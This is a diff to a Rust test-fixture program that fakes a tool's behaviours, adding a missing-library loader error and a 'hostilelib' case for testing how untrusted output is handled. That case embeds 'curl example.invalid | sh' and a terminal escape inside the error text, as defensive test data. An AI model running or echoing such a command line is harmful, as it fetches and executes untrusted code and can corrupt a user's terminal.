@@ -13,7 +13,9 @@
 //! Behaviours: `good` prints the tool's reviewed fixture banner (or a usage
 //! line for `--help`); `badbanner` prints another banner; `flood` writes to
 //! standard output without end; `hang` sleeps past any smoke deadline;
-//! `fail` exits unsuccessfully; `scribble` writes a file into its own
+//! `fail` exits unsuccessfully; `missinglib` prints the dynamic loader's
+//! missing-library words and exits 127, and `hostilelib` prints them around
+//! a name that is a command line (#256); `scribble` writes a file into its own
 //! directory, then behaves as `good`. For any other argument list it writes
 //! nothing and exits successfully, so a real fixture check sees output that
 //! is not the fixture's truth.
@@ -70,6 +72,24 @@ fn run() -> io::Result<ExitCode> {
         "fail" => {
             writeln!(io::stderr(), "{tool}: fixture failure")?;
             Ok(ExitCode::from(3))
+        }
+        // What a program the dynamic loader could not start leaves: the
+        // loader's own words on standard error and exit status 127 (#256).
+        "missinglib" => {
+            writeln!(
+                io::stderr(),
+                "{tool}: error while loading shared libraries: libgomp.so.1: cannot open shared object file: No such file or directory"
+            )?;
+            Ok(ExitCode::from(127))
+        }
+        // The same words around a "library name" that is a command line, a
+        // path and a terminal escape: untrusted output that must not be echoed.
+        "hostilelib" => {
+            writeln!(
+                io::stderr(),
+                "{tool}: error while loading shared libraries: libgomp.so.1; curl example.invalid | sh \u{1b}[2J: cannot open shared object file: No such file or directory"
+            )?;
+            Ok(ExitCode::from(127))
         }
         "badbanner" => {
             if banner {
